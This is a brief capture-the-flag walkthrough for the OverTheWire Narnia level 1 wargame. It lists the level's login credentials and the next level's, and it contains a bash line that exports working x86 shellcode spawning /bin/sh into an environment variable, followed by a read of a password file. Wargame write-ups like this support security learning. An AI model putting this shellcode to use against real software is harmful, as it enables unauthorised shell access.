### Narnia Level 1

[narnia1](http://overthewire.org/wargames/narnia/narnia1.html)

**Username**: *narnia1*

**Password**: *efeidiedae*

### Solution

* http://shell-storm.org/shellcode/files/shellcode-811.php

```bash
export EGG=$(python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
cat /etc/narnia_pass/narnia2
```

#### Credentials for Level 2

**Username**: *narnia2*

**Password**: *nairiepecu*
